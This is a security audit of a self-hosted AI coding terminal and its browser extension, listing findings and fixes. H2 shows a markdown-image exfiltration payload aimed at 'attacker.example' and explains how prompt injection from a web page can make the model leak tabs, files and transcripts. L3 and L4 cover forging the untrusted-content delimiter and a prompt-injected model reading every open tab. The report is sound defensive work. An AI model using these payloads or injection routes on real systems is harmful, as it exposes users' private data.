# Security & robustness audit

Full-codebase pass. Every claim below was verified against a running instance
or a probe, not read off the source. Severity is calibrated two ways, because
they differ sharply:

- **now** — you, single user, on your own tailnet. Most file-read issues are
  moot here: you already have a shell on the box.
- **oss** — if this is published and someone deploys it expecting the file
  browser, the tailnet check, or `FILES_ROOT` to be a real boundary.

The current threat model is sound and honestly documented: **anyone who can
reach the port gets a shell as `dev`, by design.** These findings are about the
places where the code promises a narrower boundary than it enforces.

---

## HIGH

> **H1 and H2 are FIXED** (this session). Both verified end-to-end on the live
> server: the zip endpoint no longer leaks a symlinked `/etc` file (0 escaped),
> and the exfil pixel is blocked at the network layer (a local listener got 1
> connection without CSP, 0 with it). Tests in `test/files.test.ts` and
> `test/security.test.ts`; both mutation-checked. Details kept below for the
> record. **The extension needs a reload** to pick up the manifest CSP.

### H1 — Zip endpoint follows symlinks out of `FILES_ROOT`  ·  FIXED · was now: med · oss: high
`src/files.ts` `collectForZip()` → `walk()` uses `stat()` (follows symlinks)
and recurses with a raw `join`, re-checking nothing after the top-level name.
`safePath()` guards the *selected* entry but never the directory's contents.

Verified: a folder containing `symlink → /etc/ssl/certs` zipped **244 files
from /etc**; 244 of 245 entries resolved outside the root.

A user who selects a directory for download exfiltrates whatever any symlink
inside it points at. For you: you can read `/etc` anyway. For an OSS deployer
who set `FILES_ROOT=/srv/shared` believing it a sandbox: full read of the host.

Fix: in `walk()`, `lstat()` each child; skip symlinks, or `realpath` and
re-assert containment against `rootReal`. `list()` (line 62) has the same
`stat()`-follows behaviour — a symlink to `/etc/passwd` shows as a normal file
and is downloadable via `/files/read`.

### H2 — Rendered replies can exfiltrate to any URL; no CSP anywhere  ·  FIXED · was now: high · oss: high
Verified against the live renderer: `![x](http://attacker.example/px?d=…)` in a
model reply passes `DOMPurify` (images are allowed) and **the browser fires the
outbound request** — confirmed one request left for `attacker.example`. There is
**no `Content-Security-Policy`** on any page or in the extension manifest.

This crosses the real trust boundary: page content is untrusted (you label it
so in `composePrompt`), page content reaches the model, and the model's reply is
rendered in your authenticated session. A hostile page you browse can smuggle an
instruction that makes the reply carry an image whose URL encodes anything the
model just saw — tab contents, file contents, prior transcript.

Fix: add a strict CSP (`img-src 'self' data:` is the key line — it neuters the
pixel while keeping screenshots, which you serve locally). Belt-and-braces:
`DOMPurify.sanitize(…, { FORBID_TAGS: ['img'] })` is too aggressive; instead
hook `afterSanitizeAttributes` to drop non-`data:`/non-same-origin `src`/`href`.
Same three call sites: `public/index.html:604`, `extension/sidepanel.js:32`,
`public/manage.js:116`.

---

## MEDIUM

### M1 — `readTextPreview` reads the whole file into RAM  ·  now: med · oss: med
`src/files.ts:152`. The preview caps the *returned* slice at 256 KB but calls
`readFile(abs)` first — the entire file. Verified: previewing a 400 MB file drove
RSS **+400 MB** in 670 ms. A few concurrent previews of large files OOM the
service (and take every live chat's subprocess down with it). Trivial to trigger
by accident: click a big log in the file browser.

Fix: read only what you need — open a stream/FD and read the first
`min(size, cap+8192)` bytes for the NUL sniff and the slice.

### M2 — CSRF hardening gap: no-Origin requests skip the Origin check  ·  now: low · oss: med
`denyReason()` only rejects when an Origin header is *present and unlisted*.
Simple cross-site requests (`<img>`, `<script>`, form-GET) send no Origin, so a
malicious site open in your browser can drive **no-Origin GETs from your
authorized browser**, passing both halves of the check.

Not exploitable today: no GET endpoint mutates state, and cross-origin JS can't
read the responses. But `/files/read`, `/chats/:id`, `/prompts` all become
readable-by-side-channel the moment anything changes, and it's a latent
CSRF-mutation hole if any future endpoint takes a GET. Confirmed there is no
CSRF token and no `SameSite` gate — the model is purely network-position.

Fix: require a custom header (e.g. `X-Requested-By`) that only same-origin JS
can set, or treat a missing Origin on non-loopback, non-extension requests as
suspicious rather than trusted.

### M3 — File browser root includes `~/.claude/.credentials.json`  ·  now: low · oss: med
`FILES_ROOT` defaults to `/home/dev`. Verified: `/files/read?path=.claude/
.credentials.json` returns the OAuth credentials (509 bytes) as text. Anyone who
passes the gate can download your Claude subscription token — and with it, bill
your account from anywhere. Not escalation *for you* (you have the shell), but
it's the single most sensitive file on the box sitting inside the browsable root
with no exclusion list.

Fix: a denylist for `.claude`, `.ssh`, `.aws`, `.config/gh`, or default
`FILES_ROOT` to the workspace and make widening it explicit.

### M4 — Permission mode applied a tick after the session launches  ·  now: med · oss: med
`LiveChat.#spawn` calls `s.setMode(mode)` (async, fire-and-forget `void`) then
`s.start(...)` synchronously. Verified: `query()` launches with
`permissionMode:"default"` and the real mode lands one microtask later.

For a chat saved in `plan` or `acceptEdits`, there's a window at resume where
the gate runs under `default`. With `acceptEdits` the window is harmless; with
`plan` (which is *more* restrictive) it's the wrong direction only briefly. The
real bug is the ignored promise — a `setMode` rejection is swallowed and the UI
believes a mode it never got.

Fix: pass the mode into the `query()` options at construction (it already
accepts `permissionMode`), rather than setting it after start.

---

## LOW / robustness

### L1 — `Store.list()` is synchronous and re-reads every chat file  ·  perf
`src/store.ts:87`. `readdirSync` + `readFileSync` + `JSON.parse` of every
record, on the event loop. Verified: **62 ms for 500 chats** (~60 KB each) —
and it runs on every list refresh, which fires on every title/project change and
every client attach. At a few hundred chats this is a visible stall that blocks
all sockets. Fix: cache summaries, or store a lightweight index; at minimum make
it async.

### L2 — No WebSocket heartbeat server-side  ·  robustness
No `ping`/`pong` liveness on `/ws` or `/pty` (the extension pings, the server
doesn't). A half-open TCP connection (laptop sleeps, wifi drops) keeps its
`claude` subprocess and PTY alive until the kernel eventually resets — against
`MAX_LIVE=4` that's a real way to exhaust the pool with ghosts. Fix: `ws` server
ping loop with `terminate()` on missed pong.

### L3 — Prompt-injection delimiter is forgeable  ·  now: low
`composePrompt` wraps untrusted page text in `<browser-context>…</browser-context>`
but does not escape the closing tag. Verified: page text containing
`</browser-context>` yields **2** closing tags in the composed prompt — the page
can close the untrusted block early and write what looks like out-of-band
instruction. The tag is a hint to the model, not a parser boundary, so this is
soft either way, but escaping `<` in the context (or using an unguessable nonce
delimiter) removes the trick. `src/prompt.ts:26`.

### L4 — `list_tabs` / screenshots span the whole browser, not the panel  ·  by design, worth documenting
The extension has `host_permissions: <all_urls>` and `list_tabs` returns every
tab in every window. This is the documented "full control, ungated" choice, but
an OSS reader should see it stated: a prompt-injected model can enumerate and
read every open tab (your bank, your mail) with no gate. Keep, but make the
blast radius explicit in the README.

### L5 — Screenshots in a predictable world-listable /tmp dir  ·  now: low
`/tmp/code-terminal-screenshots` is `0755`, files world-readable. On a
multi-user box any local user can read captured screenshots (which may show
logged-in pages). Fix: `0700` on the dir, `mkdtemp`, or write under the
workspace.

---

## Not bugs (checked, holds up)

- **ANSI stripper** — no ReDoS: 50k-param CSI in 1 ms, 500 KB unterminated OSC
  in 6 ms. The regexes are linear.
- **`safePath` on single files** — the realpath-the-deepest-existing-component
  approach correctly contains direct symlink and `..` traversal; H1 is only the
  *recursive walk* skipping the re-check.
- **`hostMatches`** — label-based suffix match is correct: `evil.com.attacker.net`
  does not match `evil.com`. (Minor: a bare-TLD pattern `com` matches `x.com` —
  don't let users save single-label domains, but the seed prompts don't.)
- **`decide`/`answer` race** — `#pending.delete` before resolve is atomic enough;
  a double-click second call returns false cleanly.
- **Chat delete** — now archives rather than unlinks (fixed earlier this session);
  `#path` rejects non-UUID ids before touching disk.
- **`bypassPermissions`** — correctly gated behind `CODETERM_ALLOW_BYPASS`, reset
  to default on every boot by the systemd unit.
- **sudoers file** — genuinely narrow: exact unit, no wildcards, `status`/
  `journalctl` deliberately excluded (pager→root-shell reasoning is correct), and
  `no_new_privs` on the unit means the /pty shell can't `sudo` anyway (verified:
  "no new privileges flag is set, prevents sudo from running as root").

---

## Suggested order if you open-source

1. **H2 (CSP)** and **H1 (symlink walk)** — the two that break a stated boundary.
2. **M3 (credentials in root)** + **M1 (preview OOM)** — cheap, high embarrassment.
3. **M2 (CSRF header)** + **M4 (mode ordering)** — correctness/hardening.
4. **L1/L2** — before anyone runs it with real chat volume or flaky networks.
5. Rewrite the README auth section: it still says "one shared token" (L-doc) —
   token auth was removed; the model is Origin + tailscale whois. State the
   `<all_urls>` blast radius (L4) plainly.
